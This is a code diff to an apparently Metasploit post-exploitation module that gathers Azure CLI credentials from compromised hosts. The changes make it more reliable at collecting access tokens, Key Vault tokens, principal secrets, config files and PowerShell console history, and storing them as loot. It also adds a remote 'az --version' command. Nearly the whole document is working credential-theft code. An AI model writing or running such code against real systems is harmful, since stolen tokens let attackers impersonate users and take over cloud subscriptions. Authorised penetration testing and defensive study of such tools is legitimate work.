@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -15,7 +15,7 @@ class MetasploitModule < Msf::Post
         info,
         'Name' => 'Azure CLI Credentials Gatherer',
         'Description' => %q{
-          This module will collect the Azure CLI 2.0 (az cli) settings files
+          This module will collect the Azure CLI 2.0+ (az cli) settings files
           for all users on a given target. These configuration files contain
           JWT tokens used to authenticate users and other subscription information.
           Once tokens are stolen from one host, they can be used to impersonate
@@ -38,13 +38,14 @@ class MetasploitModule < Msf::Post
   end
 
   def parse_json(data)
+    data.strip!
+    # remove BOM, https://www.qvera.com/kb/index.php/2410/csv-file-the-start-the-first-header-column-name-can-remove-this
+    data.gsub!("\xEF\xBB\xBF", '')
     json_blob = nil
-    options = { invalid: :replace, undef: :replace, replace: '' }
-    str.encode(Encoding.find('ASCII'), options)
     begin
       json_blob = JSON.parse(data)
-    rescue ::JSON::ParserError
-      print_error('Unable to parse json blob')
+    rescue ::JSON::ParserError => e
+      print_error("Unable to parse json blob: #{e}")
     end
     json_blob
   end
@@ -63,7 +64,18 @@ class MetasploitModule < Msf::Post
     user_dirs
   end
 
+  def get_az_version
+    command = 'az --version'
+    command = "powershell.exe #{command}" if session.platform == 'windows'
+    version_output = cmd_exec(command, 60)
+    version_output.match(/azure-cli \((.*)\)/)
+  end
+
   def run
+    version = get_az_version
+    unless version.nil?
+      print_status("az cli version: #{version[1]}")
+    end
     profile_table = Rex::Text::Table.new(
       'Header' => 'Subscriptions',
       'Indent' => 1,
@@ -77,7 +89,7 @@ class MetasploitModule < Msf::Post
     context_table = Rex::Text::Table.new(
       'Header' => 'Context',
       'Indent' => 1,
-      'Columns' => ['Username', 'Account Type', 'Access Token', 'Graph Access Token', 'MS Graph Access Token', 'Key Vault Token']
+      'Columns' => ['Username', 'Account Type', 'Access Token', 'Graph Access Token', 'MS Graph Access Token', 'Key Vault Token', 'Principal Secret']
     )
 
     user_dirs.map do |user_directory|
@@ -86,9 +98,12 @@ class MetasploitModule < Msf::Post
 
       # ini file content, not json.
       vprint_status('  Checking for config files')
-      %w[.azure/config .Azure/config].each do |file_location|
+      %w[.Azure\config].each do |file_location|
         possible_location = ::File.join(user_directory, file_location)
-        next unless readable?(possible_location)
+        next unless exists?(possible_location)
+
+        # we would prefer readable?, but windows doesn't support it, so avoiding
+        # an extra code branch, just handle read errors later on
 
         data = read_file(possible_location)
         next unless data
@@ -99,9 +114,9 @@ class MetasploitModule < Msf::Post
       end
 
       vprint_status('  Checking for context files')
-      %w[.azure/AzureRmContext.json .Azure/AzureRmContext.json].each do |file_location|
+      %w[.Azure/AzureRmContext.json].each do |file_location|
         possible_location = ::File.join(user_directory, file_location)
-        next unless readable?(possible_location)
+        next unless exists?(possible_location)
 
         data = read_file(possible_location)
         next unless data
@@ -109,6 +124,8 @@ class MetasploitModule < Msf::Post
         loot = store_loot 'azure.context.json', 'text/json', session, data, file_location, 'Azure CLI Context'
         print_good "    #{file_location} stored in #{loot}"
         data = parse_json(data)
+        next if data.nil?
+
         results = process_context_contents(data)
         results.each do |result|
           context_table << result
@@ -116,9 +133,9 @@ class MetasploitModule < Msf::Post
       end
 
       vprint_status('  Checking for profile files')
-      %w[.azure/azureProfile.json .Azure/azureProfile.json].each do |file_location|
+      %w[.Azure/azureProfile.json].each do |file_location|
         possible_location = ::File.join(user_directory, file_location)
-        next unless readable?(possible_location)
+        next unless exists?(possible_location)
 
         data = read_file(possible_location)
         next unless data
@@ -126,6 +143,8 @@ class MetasploitModule < Msf::Post
         loot = store_loot 'azure.profile.json', 'text/json', session, data, file_location, 'Azure CLI Profile'
         print_good "    #{file_location} stored in #{loot}"
         data = parse_json(data)
+        next if data.nil?
+
         results = process_profile_file(data)
         results.each do |result|
           profile_table << result
@@ -134,7 +153,7 @@ class MetasploitModule < Msf::Post
 
       %w[.azure/accessTokens.json].each do |file_location|
         possible_location = ::File.join(user_directory, file_location)
-        next unless readable?(possible_location)
+        next unless exists?(possible_location)
 
         data = read_file(possible_location)
         next unless data
@@ -152,10 +171,9 @@ class MetasploitModule < Msf::Post
     if session.platform == 'windows'
       vprint_status('  Checking for console history files')
       ['%USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt'].each do |file_location|
-        possible_location = ::File.join(user_directory, file_location)
-        next unless readable?(possible_location)
+        next unless exists?(file_location)
 
-        data = read_file(possible_location)
+        data = read_file(file_location)
         next unless data
 
         loot = store_loot 'azure.console_history.txt', 'text/plain', session, data, file_location, 'Azure CLI Profile'
